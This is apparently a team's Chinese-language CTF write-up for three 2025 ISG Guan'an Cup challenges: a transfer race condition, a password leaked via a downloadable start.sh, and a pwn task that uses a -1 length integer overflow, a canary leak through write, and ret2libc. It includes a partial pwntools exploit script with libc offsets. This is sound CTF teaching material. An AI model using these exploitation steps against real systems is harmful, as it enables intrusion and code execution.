---
title: 2025 年 ISG 观安杯网络安全比赛部分题解（ezbank + babysec + blindpwn）
contest: 2025 ISG 观安杯
year: 2025
difficulty: medium
vuln_type: [race_condition, rce, pwn_unknown, ret2libc]
tags: [ISG 2025 观安杯 毕方安全, ezbank 转账竞争条件爆破, babysec start.sh 密码下载, blindpwn 整数溢出 长度-1, canary 17 字节栈溢出, write 泄露栈地址, 调试模式二次执行, libc 2.35 ret2libc, system binsh]
attack_chain:
  - ezbank: 注册账户 → 不断向账户 8/9 转账竞争 → 余额够买 flag
  - babysec: 访问 start.sh 下载文件 → 文件里含密码 → 登录拿 flag
  - blindpwn: 整数溢出输入 -1 (0xFFFFFFFF 长度) → 栈溢出 → write 泄露栈
  - 17 字节后是 canary → 利用 write 把 canary 字节泄露
  - 第二次执行补 canary + 覆盖返回地址到 system
  - libc 2.35 偏移 system /bin/sh
  - 覆盖最后 1 字节 → 触发 debug 模式 → pwndbg 跟踪
key_payload: "整数溢出 -1 长度 → write 泄露 canary"
one_liner: 2025 ISG 观安杯三题：ezbank 转账竞争条件 + babysec start.sh 密码 + blindpwn 整数溢出+write 泄露 canary 栈溢出。
lesson: blindpwn 整数溢出 (scanf("%d", &len) 输 -1 = 0xFFFFFFFF) 是 pwn 高频套路；write(fd, buf, n) 自动把栈上 canary 当普通数据输出 → 二次执行补 canary。
quality: high
---

# 2025 ISG 观安杯部分题解

> 战队：毕方安全实验室

## 1. ezbank（转账竞争条件）

注册账户后不断向账户 8/9 转账，**竞争条件**绕过余额校验 → 余额够买 flag 即可。

## 2. babysec（start.sh 密码下载）

访问 `start.sh` → 下载文件得到密码 → 登录拿 flag。

## 3. blindpwn（整数溢出 + canary 泄露）

```bash
[DEBUG] Received 0x109 bytes:
b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaan'
b'^_^ Thank you.n'
b'*** stack smashing detected ***: terminatedn'
```

### 整数溢出

```c
int len;
scanf("%d", &len);
read(0, buf, len);  // len=-1 → 0xFFFFFFFF → 大读取
```

输入 `-1` → `len = 0xFFFFFFFF` → 大读取触发栈溢出。

### 步骤

1. **整数溢出 -1 触发栈溢出**  
2. **write 泄露栈**：write(fd=1, buf, 0x61) 自动把栈内容当普通数据输出 → canary 字节在数据流里
3. **17 字节后是 canary**（标准布局）
4. **二次执行补 canary**：先 write 拿到 canary，再输入同样长度 + canary 字节
5. **覆盖最后 1 字节到 debug 模式入口**
6. **泄露地址** → libc 2.35 偏移
7. **覆盖返回地址到 system("/bin/sh")**

```python
from pwn import *
context.log_level = 'debug'
p = remote("isg.idss-cn.com", 22214)
p.sendlineafter("Len:", "-1")
p.send('a')
p.recvuntil("na")
leaks = []
for i in range(64):
    leaks.append(u32(p.recv(4)))
write_offset = 0x108630
puts_offset = 0x00072880
binsh_offset = 0x1b90d5
```

## 总结

- **ezbank**：race condition 转账
- **babysec**：源码泄露密码
- **blindpwn**：整数溢出 + write 泄露 canary + 二次执行补 canary + 调试模式触发
